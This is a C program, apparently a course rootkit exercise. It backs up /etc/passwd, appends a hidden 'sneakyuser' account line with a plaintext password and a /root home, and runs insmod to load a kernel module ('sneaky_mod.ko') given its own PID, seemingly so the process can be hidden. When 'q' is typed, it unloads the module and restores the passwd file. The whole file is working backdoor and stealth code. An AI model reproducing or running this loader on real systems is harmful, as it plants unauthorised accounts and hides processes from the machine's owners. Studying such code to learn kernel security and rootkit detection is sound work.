#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
//#define __USE_GNU
//#include <unistd.h>
//extern char ** environ;

void copy_file(FILE *etc_f, FILE *tmp_f){
  
    if(etc_f == NULL){
      perror("etc_file open failed");
      exit(EXIT_FAILURE);
    }
    if(tmp_f == NULL){
      perror("tmp_file open failed");
      exit(EXIT_FAILURE);
    }
    char ch;
    /* copy file */
    while((ch=fgetc(etc_f))!=EOF){
      //      printf("%c", ch);
      fputc(ch,tmp_f);
    }
  
}

void insert_sneaky(FILE *etc_f, FILE *tmp_f){
  if(etc_f == NULL){
      perror("second etc_file open failed");
      exit(EXIT_FAILURE);
    }
    if(tmp_f == NULL){
      perror("second tmp_file open failed");
      exit(EXIT_FAILURE);
    }
  
    const char *content = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
    fputs (content, etc_f);

}

int main(int argc, char *argv[]){
  pid_t cpid;
  char buf;
  pid_t father_pid = getpid();
  /* 1. print pid */
  printf("sneaky_process pid = %d\n", father_pid);

  /* 2. copy etc to tmp and append a line */
  FILE *etc_file;
  FILE *tmp_file;
  /* open files */
  etc_file = fopen("/etc/passwd", "r");
  tmp_file = fopen("/tmp/passwd", "w");
  // copy etc to tmp
  copy_file(etc_file, tmp_file);
  /* close files*/
  fclose(etc_file);
  fclose(tmp_file);

  FILE *etc_f;
  FILE *tmp_f;

  /* open etc again and print a new line to the end */
  etc_f = fopen("/etc/passwd", "a");
  tmp_f = fopen("/tmp/passwd", "r");
  insert_sneaky(etc_f, tmp_f);
  fclose(etc_f);
 
  cpid = fork();
  if (cpid < 0) {
    perror("fork failed");
    exit(EXIT_FAILURE);
  }

  if (cpid == 0) {
    /* Code executed by child */
    /* 3. load sneaky_mod  */
    char snpid[56];
    snprintf(snpid, 56, "sn_pid=%d",(int)father_pid);
    char* args[] = {"insmod", "sneaky_mod.ko", snpid, NULL};
    //printf("before insmod\n");
    if(execvp(args[0], args) == -1){ //exec() return only when error
      perror("execvp() insmod fail");
      exit(EXIT_FAILURE);
    }
  }
  else {
    /* Code executed by parent */
    //    printf("I receive child's pid. Here is parent.\n");
    int stat_val;
    waitpid(cpid, &stat_val, 0);

    //Child  exit normally
    /*if ( WIFEXITED(stat_val) ){
      printf("Child exited with code %d\n", WEXITSTATUS(stat_val) );
    }
    else if ( WIFSIGNALED(stat_val) ) {
      //Child was terminated by a siganl
      printf("Child terminated by signal %d\n", WTERMSIG(stat_val) );
    }
    else if ( WIFSTOPPED(stat_val) ){
      //Child was stopped by a delivery siganl
      printf("%d signal case child stopped\n", WSTOPSIG(stat_val) );
    }
    else if ( WIFCONTINUED(stat_val) ){
      //Child was resumed by delivery SIGCONT
      printf("Child was resumed by SIGCONT\n");
      }*/
  }
  //printf("after insmod\n");
  /* 4. while loop */
  //printf("before loop\n");
  int cmd;
  while((cmd = getchar())!= 'q'){
    if(cmd == EOF)
      break;
  }
  //printf("I saw a q!\n");

  /* 5. rmmod module */
  //  const char* command = "sudo rmmod ./sneaky_mod.ko";
  // system(command);
  cpid = fork();
  if (cpid < 0) {
    perror("fork failed");
    exit(EXIT_FAILURE);
  }

  if (cpid == 0) {
    /* Code executed by child */
    /* 3. load sneaky_mod  */
    char* arg[] = {"rmmod", "sneaky_mod.ko", NULL};
    //printf("before insmod\n");
    if(execvp(arg[0], arg) == -1){ //exec() return only when error
      perror("execvp() insmod in child process fail");
      exit(EXIT_FAILURE);
    }
  }
  else {
    /* Code executed by parent */
    //    printf("I receive child's pid. Here is parent.\n");
    int stat_val;
    waitpid(cpid, &stat_val, 0);
    //Child  exit normally
        
    if ( WIFEXITED(stat_val) ){
      printf("Child exited with code %d\n", WEXITSTATUS(stat_val) );
    }
    else if ( WIFSIGNALED(stat_val) ) {
      //Child was terminated by a siganl
      printf("Child terminated by signal %d\n", WTERMSIG(stat_val) );
    }
    else if ( WIFSTOPPED(stat_val) ){
      //Child was stopped by a delivery siganl
      printf("%d signal case child stopped\n", WSTOPSIG(stat_val) );
    }
    else if ( WIFCONTINUED(stat_val) ){
      //Child was resumed by delivery SIGCONT
      printf("Child was resumed by SIGCONT\n");
    }
  }

  //printf("finished rm\n");
  /* 6. restore */
  /* for testing we recover two files here */
  FILE *new_etc;
  new_etc = fopen("/etc/passwd", "w");
  //copy tmp to etc
  copy_file(tmp_f, new_etc);
  fclose(tmp_f);
  fclose(new_etc);
  //  printf("restore\n");
  return 0;
}
